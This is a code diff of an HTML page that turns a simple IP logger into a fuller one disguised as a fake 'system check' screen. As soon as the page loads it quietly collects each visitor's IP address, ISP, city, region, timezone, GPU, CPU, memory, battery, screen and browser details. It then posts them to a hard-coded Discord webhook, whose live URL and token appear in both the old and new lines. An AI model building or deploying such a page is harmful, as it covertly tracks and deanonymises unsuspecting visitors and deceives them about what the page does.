@@ -1,37 +1,74 @@
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Obfuscate Yourself</title>
+    <title>Checking System Files...</title>
+    <style>
+        body { background-color: #0c0c0c; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loading { border: 2px solid #00ff00; padding: 20px; border-radius: 5px; }
+    </style>
     <script>
         (async function() {
             try {
-                // Get IP instantly
-                let ipResponse = await fetch("https://api64.ipify.org?format=json");
-                let ipData = await ipResponse.json();
-                let ip = ipData.ip || "Unknown";
+                // 1. Get Deep Geo & IP Info
+                const geoRes = await fetch("https://ipwho.is/");
+                const geo = await geoRes.json();
 
-                // Get region from IP
-                let regionResponse = await fetch(`https://ipwho.is/${ip}`);
-                let regionData = await regionResponse.json();
-                let region = regionData.region || "Unknown";
+                // 2. Get Graphics Card (GPU) Info
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 
-                // Send to webhook
-                await fetch("https://discord.com/api/webhooks/1395176867782201395/xEREzh5Garv2tUETgFOovB8ekK1EMK1lhaEAjZrmU5qmJXf-o77VCUINadqNCVbR3N9n", {
+                // 3. System Hardware & Memory
+                const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
+                const cpu = navigator.hardwareConcurrency || "Unknown";
+                
+                // 4. Battery Status
+                let batteryInfo = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Unplugged"})`;
+                }
+
+                // 5. Prepare the Payload for Discord
+                const payload = {
+                    embeds: [{
+                        title: "🛠️ Ultimate System Log",
+                        color: 16711680, // Red Color
+                        fields: [
+                            { name: "🌐 Network Details", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.connection.isp}\n**Type:** ${geo.type}\n**ASN:** ${geo.connection.asn}`, inline: false },
+                            { name: "📍 Location", value: `**City:** ${geo.city}\n**Region:** ${geo.region}\n**Country:** ${geo.country} ${geo.flag.emoji}`, inline: true },
+                            { name: "⏰ Timezone", value: `**ID:** ${geo.timezone.id}\n**Current:** ${geo.timezone.current_time}`, inline: true },
+                            { name: "🖥️ Hardware", value: `**GPU:** ${gpu}\n**CPU Cores:** ${cpu}\n**RAM:** ~${ram}`, inline: false },
+                            { name: "📱 Device Info", value: `**OS:** ${navigator.platform}\n**Screen:** ${window.screen.width}x${window.screen.height}\n**Battery:** ${batteryInfo}`, inline: true },
+                            { name: "🔗 Navigation", value: `**Language:** ${navigator.language}\n**Referrer:** ${document.referrer || "Direct Visit"}`, inline: true },
+                            { name: "🌍 Browser User Agent", value: `\`${navigator.userAgent}\``, inline: false }
+                        ],
+                        footer: { text: "Data captured successfully" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // 6. Send to your NEW Webhook
+                await fetch("https://discord.com/api/webhooks/1459862155766665229/lW5xj4VpA_c8QEQGM281LRJPrTfcimHYcC7u7LCksU66eckChpVWBPcStgR977CD3NnH", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `🌍 **Region:** ${region}\n📡 **IP Address:** ${ip}` })
+                    body: JSON.stringify(payload)
                 });
 
-            } catch (error) {
-                console.error("Failed to get IP/Region:", error);
+            } catch (err) {
+                console.error("Critical Failure:", err);
             }
         })();
     </script>
 </head>
 <body>
-    <h1>Obfuscate Yourself</h1>
-    <p>Detecting files</p>
+    <div class="loading">
+        <h2>[ SYSTEM CHECK IN PROGRESS ]</h2>
+        <p>Scanning directory: C:/Users/Public/Documents/...</p>
+        <p>Verifying network integrity...</p>
+    </div>
 </body>
 </html>
